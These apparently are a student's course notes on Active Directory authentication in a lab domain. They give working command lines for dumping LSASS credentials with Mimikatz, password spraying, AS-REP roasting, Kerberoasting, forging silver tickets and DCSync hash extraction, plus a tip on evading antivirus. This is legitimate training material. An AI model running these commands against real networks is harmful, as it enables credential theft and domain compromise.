# Understanding Active Directory Authentication

### NTLM Authentication
		- used when a client authenticates to a server by IP address (instead of by hostname),1 or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

### Kerberos Authentification

- Key differences:
	- NTLM authentication = challenge-and-response 			
	- Kerberos authentication = ticket system.
	- Key Distribution Center (KDC) (domain controller).
		- The client starts the authentication process with the KDC and not the application server.
		- A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

Login:
	1. an *Authentication Server Request* (AS-REQ) is sent to the domain controller.
		- The domain controller, acting as a KDC, also maintains the Authentication Server service.
		- The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user and their username.
	2. When the domain controller receives the request, it looks up the password hash associated with the specific user in the **ntds.dit** file and attempts to decrypt the timestamp
		- If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.
	3. Next, the domain controller replies to the client with an Authentication Server Reply (AS-REP).
		- Since Kerberos is a stateless protocol, the AS-REP contains a *session key* and a *Ticket Granting Ticket* (TGT).
			- The session key is encrypted using the user's password hash and may be decrypted by the client and then reused.
			- The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key.
		- To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the *krbtgt* account) known only to the KDC and cannot be decrypted by the client.
	4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete.
		- By default, the TGT will be valid for ten hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.
		- When the user wishes to access resources of the domain, such as a network share or a mailbox, it must again contact the KDC.
	5. This time, the client constructs a Ticket Granting Service Request (TGS-REQ) packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.
	6. Next, the ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC.
	7. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. At this point the KDC performs several checks:
		1. The TGT must have a valid timestamp.
		2. The username from the TGS-REQ has to match the username from the TGT.
		3. The client IP address needs to coincide with the TGT IP address.
	8. If this verification process succeeds, the ticket-granting service responds to the client with a Ticket Granting Server Reply (TGS-REP). This packet contains three parts:
		1. The name of the service for which access has been granted.
		2. A session key to be used between the client and the service.
		3. A service ticket containing the username and group memberships along with the newly-created session key.
		- The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT. 
		- The service ticket is encrypted using the password hash of the service account registered with the service in question.
	- Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.
	9. First, the client sends the application server an Application Request (AP-REQ), which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.
	10. The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the AP-REQ. If the AP-REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.

### Cached AD Credentials

-  *LSASS* (Local Security Authority Subsystem Service) memory space
	- Hashes are stored in LSASS
	- runs as SYSTEM (system process)
		- we need SYSTEM (or local administrator) perm
		- usually start our attack with a local privilege escalation
	- the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key

- *Mimikatz* -> important note
		- [Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell,4 or use a built-in tool like Task Manager to dump the entire LSASS process memory,5 move the dumped data to a helper machine, and then load the data into Mimikatz]

Example with **hashes**:
- Setup (Since the jeff domain user is a local administrator on CLIENT75, we are able to launch a PowerShell prompt with elevated privileges.)
- First, let's connect to this machine as jeff over RDP
	- `xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.200.75`
- Start a PowerShell session as Admin
- Start Mimikatz and enter **privilege::debug** to engage the *SeDebugPrivlege* privilege, which will allow us to interact with a process owned by another account.
	-`cd C:\Tools`
	- `.\mimikatz.exe`
	- `privilege::debug`
- Now we can run **sekurlsa::logonpasswords** to dump the credentials of all logged-on users with the *Sekurlsa* module
		- This should dump hashes for all users logged on to the current workstation or server, *including remote logins* like Remote Desktop sessions.
	- `sekurlsa::logonpasswords`

- [Note]
	- effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional LSA Protection.10 The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.
		- Taught in **PEN-300** (OffSec's Evasion Techniques and Breaching Defenses course)

- Use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.

Example with **Tokens/Tickets**:
- Create and cache a service ticket.
	- Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup.
		- `dir \\web04.corp.com\backup`
- Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering **sekurlsa::tickets**
	- `sekurlsa::tickets`
	- output --> a TGT and a TGS
	-  Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
	- Mimikatz can also export tickets to the hard drive and import tickets into LSASS

- *PKI* (Public Key Infrastructure)
	- Microsoft provides the AD role *AD CS* (*Active Directory Certificate Services*) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources
	- If a server is installed as a *CA* (*Certification Authority*), it can issue and revoke digital certificates (and much more)
	- These certificates may be marked as having a non-exportable private key for security reasons
	- If so, a private key associated with a certificate cannot be exported even with administrative privileges. However, there are various methods to export the certificate with the private key.
	- We can rely again on Mimikatz to accomplish this. The *crypto* module contains the capability to either patch the CryptoAPI18 function with **crypto::capi** or KeyIso20 service with **crypto::cng**, making non-exportable keys exportable.

# Performing Attacks on Active Directory Authentication

### Password Attacks
		- When performing a brute force or wordlist authentication attack, we must be aware of account lockouts.

Set up:
	- RDP user jeff on CLIENT75 with the password HenchmanPutridBonbon11.
	- Obtain the account policy with **net accounts**
		-`net accounts`

1st Type of password attack (LDAP & ADSI):
- Uses LDAP and ADSI to perform a low and slow password attack against AD users.
	- we can also make queries in the context of a different user by setting the DirectoryEntry instance
		- provide three arguments, including the LDAP path to the domain controller, the username, and the password
	- ```$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")```
	- output -> ```distinguishedName : {DC=corp,DC=com}
		Path: LDAP://DC1.corp.com/DC=corp,DC=com```
	- To avoid incorrect password Exceptions
		-change the password in the constructor to **WrongPassword**
- We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.
	-This password spraying tactic is already implemented in the PowerShell script **`C:\Tools\Spray-Passwords.ps1`**
	-`cd C:\Tools`
	- `powershell -ep bypass`
	- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
		- -Pass =  set a single password to test
		- -File =  submit a wordlist file 
		- -Admin = test admin accounts
	- Output --> ```'pete' with password: 'Nexus123!'
		 'jen' with password: 'Nexus123!'```

2nd Type of Password spraying attack (SMB):
	- Drawback:
		- For example, for every authentication attempt, a full SMB connection has to be set up and then terminated.
	- **crackmapexec**
		- `cat users.txt`
		- `crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success`
			- smb = protocol
			- -u = username/file
			- -p = password
			- -d = domain
			- --continue-on-success = avoid stopping at the first valid credential
	- Bonus:
		- output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has admin priv on tgt system
	- Dave is a local admin on CLIENT75. Let's use crackmapexec with the password Flowers1 targeting this machine
		-`crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com`

3rd Type of Password spraying attack (TGT)
- *kinit*
	- Can obtain and cache a Kerberos TGT
		- Need to provide a username and password
	- Advantage:
		-  only uses two UDP frames
			- To determine whether the password is valid, it sends only an AS-REQ and examines the response
- *kerbrute*
	- automate obtaining and caching a Kerberos TGT
	- Location: **`C:\Tools`**
	`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`
		- passwordspray = command 
		- -d = domain
		- user.file pass
		-[`If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.`]

### AS-REP Roasting

- *Kerberos preauthentication*
	- As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT
- *AS-REP Roasting* (attack)
	- Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
	- By default, the AD user account option Do not require Kerberos preauthentication is disabled
	-  However, it is possible to enable this account option manually	

Perform AS-REP Roasting on Linux
- ** impacket-GetNPUsers**
	- To perform AS-REP roasting
	- `impacket-GetNPUsers -dc-ip 192.168.200.70  -request -outputfile hashes.asreproast corp.com/pete`
		- password = Nexus123!
		- **-dc-ip** =  IP address of the domain controller
		- **-outputfile** = output file in which the AS-REP hash will be stored in Hashcat format
		- **-request** = request the TGT
		- **domain/user** = user authentification format
	-  Check the correct mode for the AS-REP hash in Hashcat
		-`hashcat --help | grep -i "Kerberos"`
		- output --> `18200 | Kerberos 5, etype 23, AS-REP`
	- Crack the hash
		-`sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
		- output --> Flowers1
			- If you get "Not enough allocatable device memory for this attack", shut down your Kali VM and add more RAM to it.

Perform AS-REP Roasting on Windows
- *Rubeus*
	- toolset for raw Kerberos interactions and abuses
	- Set up:
		-RDP -> CLIENT75 jeff HenchmanPutridBonbon11
	- Start:
		- `cd C:\Tools`
		- `.\Rubeus.exe asreproast /nowrap`
			- **asreproast** = pre-authenticated domain
			- **/nowrap** = no new lines
		- Copy hash to home dir and crack
			- `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
-  Identify users with the enabled AD user account option *Do not require Kerberos preauthentication*
	- [Windows] PowerView
		- *Get-DomainUser*
			- **-PreauthNotRquired**
	- [Kali] *impacket-GetNPUsers*
		- without the **-request** and **-outputfile** options.
- Can use *GenericWrite* or *GenericAll* permissions to modify the User Account Control value of the user to not require Kerberos preauthentication.
	- Known as *Targeted AS-REP Roasting*

### Kerberoasting

*Kerberoasting*
- Concept:
	- When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
	- These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.
	- The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.
	
- Example on Windows (w/ Rubeus):
	- In this section, we will abuse a service ticket and attempt to crack the password of the service account.
	- Set up:
		- Let's begin by connecting to CLIENT75 via RDP as jeff with the password HenchmanPutridBonbon11.
	- Start:
	- Use Rubeus
			- Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user
		- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
			- **kerberoast** -> technique
			- **hashes.kerberoast** ->  the resulting TGS-REP hash
			- output -> 1 usr hash
	- Copy **hashes.kerberoast** to our Kali to crack
		- `cat hashes.kerberoast`
		- `hashcat --help | grep -i "Kerberos"`
		- `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
		- output -> Strawberry1

- Example on Linux (w/ impacket)
	- Use *impacket-GetUserSPNs*
			-Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash
		- `sudo impacket-GetUserSPNs -request -dc-ip 192.168.200.70 corp.com/pete`
		- [Note]:
			- [`If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so`]
	- Store the TGS-REP hash in a file named hashes.kerberoast2 and crack it
		- `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

- This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords
- However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible
-  Same is true for the *krbtgt* user account
	-  acts as service account for the KDC
- Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account -->  we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named *targeted Kerberoasting*

### Silver Tickets
		- Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

- *Privileged Account Certificate (PAC) validation*
	- If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.
		- Fortunately for this attack technique, service applications rarely perform PAC validation.
	- As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.
	- With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket3 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
	- In this section's example, we'll create a silver ticket to get access to an HTTP SPN resource. As we identified in the previous section, the iis_service user account is mapped to an HTTP SPN. Therefore, the password hash of the user account is used to create service tickets for it. For the purposes of this example, let's assume we've identified that the iis_service user has an established session on CLIENT75.
- Need 3 things to create a silver ticket:
	- SPN password hash
	- Domain SID
	- Target SPN
- Example:
	- Set up:
		- Let's get straight into the attack by connecting to CLIENT75 via RDP as jeff with the password HenchmanPutridBonbon11.
	- Start:
	- Confirm that our current user has no access to the resource of the HTTP SPN mapped to iis_service.
		- `iwr -UseDefaultCredentials http://web04`
	- Since we are a local Administrator on this machine where iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (1st info we need)
		- Start PowerShell as Administrator and launch **Mimikatz**:
		- `.\mimikatz
		- `privilege::debug`
		- `sekurlsa::logonpasswords`
	- We can enter **whoami /user** to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain. (2nd info we need)
		- `whoami /user`
		- output -> [S-1-5-21-1987370270-658905905-1781884369]-1105
			-omit RID
	- We'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) (3rd info we need)

- Command:
	- `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
		- **kerberos::golden** -> module
		- **/sid:** -> domain SID
		- **/domain:** ->  domain name
		- **/target:** -> target where the SPN runs
		- **/service:** -> SPN protocol
		- **/rc4:** -> NTLM hash of the SPN
		- **/ptt** -> allows us to inject the forged ticket into  memory
		- **/user:** -> an existing domain user

		- From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 )
	- Confirm ticket ready to use in memory
		-`klist`
	- Verify
		- `iwr -UseDefaultCredentials http://web04`
	- To help find flag add:
		- `"| findstr /i OS{"`
		- Actually:
			- `PS C:\Tools> (iwr -UseDefaultCredentials http://web04).content/ | findstr /i "OS{"` <-- display web content through HTTP request
- [Note]:
	-  It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.
	- Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. 
	- Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist.

### Domain Controller Synchronization

- *DRS* (*Directory Replication Service*)  Remote Protocol
	- Uses *replication* to synchronize these redundant domain controllers
	- A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.
	- the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
- Need to have:
	- *Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set* rights.
	- By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
	
	- *dcsync* attack
		- If we obtain access to a user account in one of these groups or with these rights assigned where we can impersonate a domain controller

Example (w/ Mimikatz (Windows)):
- Set up:
	- RDP CLIENT75 as jeffadmin with the password BrouhahaTungPerorateBroom2023!.
	-  jeffadmin is a member of the Domain Admins group
- Start:
	- `cd C:\Tools\`
	- `.\mimikatz.exe`
	- `lsadump::dcsync /user:corp\dave`
		- **lsadump::dcsync** -> module
		- **/user:** -> domain\user
		- output -> NTLM hash
- Crack the hash
	- `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- output -> Flowers1
- We can now obtain the NTLM hash of any domain user account of the domain **corp.com**
	- Get Admin hash
		- `lsadump::dcsync /user:corp\Administrator`
		- output -> Admin NTLM hash

Example (w/ *impacket-secretsdump* (Linux)):
- Start:
	- `impacket-secretsdump -just-dc-user maria corp.com/mike:"Darkness1099\!"@192.168.200.70`
		- **-just-dc-user** -> tgt user
		- provide creds of user with rights
			- **domain/user:password@ip.**
		- uses *DRSUAPI* the Microsoft API implementing the Directory Replication Service Remote Protocol.

- [Note]:
	- Need a user that is a member of (Domain Admins, Enterprise Admins, or Administrators*
	- Needs *Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set* rights.
└─$ xfreerdp /cert-ignore /u:mike /d:corp.com /p:Darkness1099\! /v:192.168.200.75
